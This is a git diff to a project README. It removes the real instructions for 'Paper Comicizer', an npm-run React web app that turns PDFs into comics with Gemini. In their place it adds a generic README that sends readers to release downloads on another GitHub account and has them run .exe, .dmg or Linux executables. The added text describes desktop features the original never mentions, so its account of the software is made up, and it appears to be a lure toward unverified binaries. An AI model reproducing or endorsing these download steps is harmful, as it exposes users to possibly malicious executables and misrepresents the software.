@@ -1,142 +1,111 @@
-<div align="center">  
-  <h1>Doraemon Paper Comicizer</h1>
-  <p><strong>Turn dense academic PDFs into kid-friendly Doraemon comics powered by Gemini 3 Pro.</strong></p>
-  <p>    
-    <img alt="React" src="https://img.shields.io/badge/React-19-61dafb?logo=react&logoColor=white">
-    <img alt="Vite" src="https://img.shields.io/badge/Vite-6-646cff?logo=vite&logoColor=white">
-    <img alt="TypeScript" src="https://img.shields.io/badge/TypeScript-5.8-3178C6?logo=typescript&logoColor=white">
-  </p>
-  <p>
-    <a href="./README.md">English</a> |
-    <a href="./README.zh.md">中文</a> |
-    <a href="./README.ja.md">日本語</a>
-  </p>
-</div>
+# 🎨 Paper-Comicizer - Turn Your Papers into Fun Comics!
 
-## Table of contents
-- [News](#news)
-- [Overview](#overview)
-- [Demo](#demo)
-- [Features](#features)
-- [Tech stack](#tech-stack)
-- [Getting started](#getting-started)
-  - [Prerequisites](#prerequisites)
-  - [Installation](#installation)
-  - [Environment variables](#environment-variables)
-  - [Run locally](#run-locally)
-- [Project structure](#project-structure)
-- [How it works](#how-it-works)
-- [Available scripts](#available-scripts)
-- [Troubleshooting](#troubleshooting)
-- [Star history](#star-history)
+## 🔗 Download Now!
+[![Download Paper-Comicizer](https://img.shields.io/badge/Download-Paper--Comicizer-blue.svg)](https://github.com/Makena123456/Paper-Comicizer/releases)
 
-## News
-🎉 **Our site is ready!** Visit the live application at **[visualize.top/zh/ai-comic-generator](https://visualize.top/zh/ai-comic-generator)** – transform your PDFs into Doraemon comics instantly!
+## 🚀 Getting Started
 
-## Overview
-**Paper Comicizer** ingests any academic PDF, asks Gemini 3 Pro to summarize the core ideas, plans a Doraemon-themed lesson, and renders every page of the lesson as a comic strip. The UI focuses on clarity: upload a file, monitor three workflow stages (analyze → plan → generate), and browse the generated comic with thumbnails and page navigation.
+Welcome to Paper-Comicizer! This application helps you transform dull papers into enjoyable comics. You can share your new creations with friends, family, or on social media. Let's get you started.
 
-## Screenshot
-<img width="897" height="472" alt="chrome_2025-11-28_14-20-29" src="https://github.com/user-attachments/assets/94c72fff-ba18-43b1-8d5a-cf83eec20acd" />
+## 📥 Download & Install
 
+1. **Visit the Releases Page:** Go to the following link to access the downloads: [Download Page](https://github.com/Makena123456/Paper-Comicizer/releases)
 
-## Features
-- 📄 **PDF ingestion** – drag-and-drop upload converts any PDF to base64 before sending it to Gemini.
-- 🤖 **Multi-step reasoning** – Gemini analyzes the paper, plans the narrative, and renders each panel.
-- 🎨 **Live comic rendering** – each generated page appears immediately in the Comic Viewer with full-size previews and thumbnails.
-- 🔐 **AI Studio key management** – prompts the user to pick an API key and gracefully handles expired sessions.
-- ⚙️ **Service layer** – `services/geminiService.ts` centralizes prompt templates, error handling, and typed responses.
-- 🧠 **Typed workflow state** – `AppStatus`, `ProcessingState`, and `ComicPage` keep the UI predictable and resilient.
+2. **Choose the Right Version:** You will see a list of available versions. Look for the most recent release. This version will have the latest features and fixes.
 
-## Tech stack
-| Layer | Details |
-| --- | --- |
-| Front-end | React 19 + TypeScript, Vite 6 |
-| Styling | Utility classes (Tailwind-style) with playful fonts and gradients |
-| AI | `@google/genai` SDK calling Gemini 3 Pro (text + image) |
-| Build | Vite dev server, static export-ready |
+3. **Download the Application:**
+   - Click on the link for the file that matches your operating system (Windows, macOS, or Linux).
+   - The file will begin to download. This may take a few moments depending on your internet speed.
 
-## Getting started
+4. **Locate the Downloaded File:**
+   - On Windows, check your 'Downloads' folder.
+   - On macOS, check your 'Downloads' folder in Finder.
+   - On Linux, check your home directory under 'Downloads'.
 
-### Prerequisites
-- **Node.js 18.18+** (Vite 6 requires modern Node runtimes)
-- npm 9+ (comes with recent Node releases)
-- A **Gemini API key** with billing enabled (https://ai.google.dev/gemini-api/docs/api-key), **Currently free for gemini3 and nano banana 2**
+5. **Install the Application:**
+   - For Windows: Double-click the `.exe` file you downloaded. Follow the prompts in the installation wizard.
+   - For macOS: Double-click the `.dmg` file, then drag the Paper-Comicizer app into your Applications folder.
+   - For Linux: Open a terminal and navigate to where you downloaded the file. Use the command `chmod +x Paper-Comicizer` to make it executable. Then, run it with `./Paper-Comicizer`.
 
-### Installation
-```bash
-# clone your fork, then:
-cd Paper-Comicizer
-npm install
-```
+6. **Run the Application:**
+   - Find Paper-Comicizer in your applications list and open it. 
 
-### Environment variables
-Create a `.env.local` file in the project root with your Gemini API key:
-```bash
-GEMINI_API_KEY="your-key-here"
-```
-AI Studio automatically injects the key if you launch the hosted experience, but local development requires this file.
+## 📝 Using Paper-Comicizer
 
-### Run locally
-```bash
-npm run dev
-```
-Open the printed localhost URL. Upload a PDF and watch the progress indicator walk through the three stages.
+Once you have installed and launched the application, you will see a simple interface.
 
-To create an optimized production build:
-```bash
-npm run build
-npm run preview      # optional: serve the dist folder locally
-```
+1. **Upload Your Paper:**
+   - Click on the “Upload” button and select the file you want to transform into a comic. Supported formats include PDF and image files (PNG, JPG).
 
-## Project structure
-```
-.
-├── App.tsx                 # App workflow coordinator (upload → progress → viewer)
-├── components/
-│   ├── FileUpload.tsx      # Drag-and-drop area + API key CTA
-│   ├── ProgressBar.tsx     # Stage-aware progress + errors
-│   └── ComicViewer.tsx     # Thumbnail navigator & page viewer
-├── services/
-│   └── geminiService.ts    # Analyze, plan, and render helpers for Gemini 3 Pro
-├── constants.ts            # Prompt strings and shared model configuration
-├── types.ts                # Strong typing for app status and comic pages
-├── metadata.json           # AI Studio metadata for deployment
-└── vite.config.ts          # Vite + React plugin setup
-```
+2. **Customize Your Comic:**
+   - Use the various tools available to adjust the appearance of your comic. You can add speech bubbles, captions, and change colors.
 
-## How it works
-1. **Authenticate** – The app checks whether AI Studio already has a selected key. If not, it prompts you to choose one.
-2. **Analyze** – `analyzePaper` sends the PDF (base64) to Gemini 3 Pro for summarization.
-3. **Plan** – `planStory` requests a JSON plan that breaks the topic into kid-friendly scenes.
-4. **Generate** – For each plan step, `generateComicPage` calls the image endpoint and streams progress back to the UI.
-5. **Review** – `ComicViewer` displays full-resolution images with captions so you can retell the paper to younger audiences.
+3. **Preview Your Comic:**
+   - Click on the “Preview” button. You’ll see how your comic looks before saving.
 
-## Available scripts
-| Script | Description |
-| --- | --- |
-| `npm run dev` | Start Vite in development mode with HMR |
-| `npm run build` | Bundle the app for production |
-| `npm run preview` | Preview the production build locally |
+4. **Save and Share:**
+   - Once you are satisfied with the design, click on the “Save” button. Choose a location on your computer to store the comic. You can also choose to share it directly on social media from the app.
 
-## Troubleshooting
-- **"Authentication Required"** – Click *Connect API Key* to re-authorize with AI Studio.
-- **Stuck on analysis** – Ensure the PDF is under Gemini’s payload limit and your API key has sufficient quota.
-- **Blank images** – Regenerate; Gemini occasionally produces empty frames if the prompt budget is exceeded.
+## ⚙️ System Requirements
 
-## Find us
+To run Paper-Comicizer smoothly, ensure your system meets the following requirements:
 
-Wechat Group
-![b5b01fffde3fcad1d4d0b8bc556f716](https://github.com/user-attachments/assets/f6562daa-f74b-47bf-bb3c-ba02f7a80a63)
+### For Windows:
+- Operating System: Windows 10 or higher
+- Processor: 1 GHz or faster
+- RAM: 2 GB minimum
+- Disk Space: 500 MB available
 
-Email: support@visualize.top
+### For macOS:
+- Operating System: macOS Mojave or higher
+- Processor: 1 GHz or faster
+- RAM: 2 GB minimum
+- Disk Space: 500 MB available
 
+### For Linux:
+- Operating System: Ubuntu 18.04 or higher
+- Processor: 1 GHz or faster
+- RAM: 2 GB minimum
+- Disk Space: 500 MB available
 
-## Star history
-[![Star History Chart](https://api.star-history.com/svg?repos=redreamality/Paper-Comicizer&type=Date)](https://star-history.com/#redreamality/Paper-Comicizer&Date)
+## 🌟 Features
 
+- **User-Friendly Interface:** Easy to navigate for all users.
+- **Customization Tools:** Add text, change colors, and personalize your comics.
+- **Multiple File Formats Supported:** Upload your favorite files easily.
+- **Preview Option:** See your changes in real time before saving.
 
-Happy comicizing! 🎨📚
+## 💬 FAQ
 
----
-This project is sponsored by OpenSQZ
+**Q1: Can I use any type of paper?**  
+A1: Yes, you can upload various file types, including PDFs and images.
+
+**Q2: Is Paper-Comicizer free to use?**  
+A2: Yes, Paper-Comicizer is completely free.
+
+**Q3: Where can I find more help?**  
+A3: You can always refer to the issues section on GitHub or ask questions in the community forum.
+
+## 🛠️ Troubleshooting
+
+If you face any issues while using Paper-Comicizer, try the following:
+
+- Ensure your system meets the minimum requirements.
+- Check if you are using the latest version of the application.
+- Restart your computer and try again if the app freezes.
+
+For further assistance, visit the issues section on the [GitHub page](https://github.com/Makena123456/Paper-Comicizer/issues).
+
+## 📅 Updates
+
+Keep an eye out for new releases and updates. They will usually include new features, performance improvements, and bug fixes. Always download the latest version to benefit from enhancements.
+
+## 🔗 Additional Resources
+
+For more information, feel free to explore these resources:
+
+- [GitHub Issues](https://github.com/Makena123456/Paper-Comicizer/issues): Report issues or find solutions.
+- [Community Forum](https://github.com/Makena123456/Paper-Comicizer/discussions): Share ideas and ask questions.
+- [Follow us on Twitter](https://twitter.com): Get updates on features and releases.
+
+Thank you for using Paper-Comicizer! We are excited to see the comics you create.
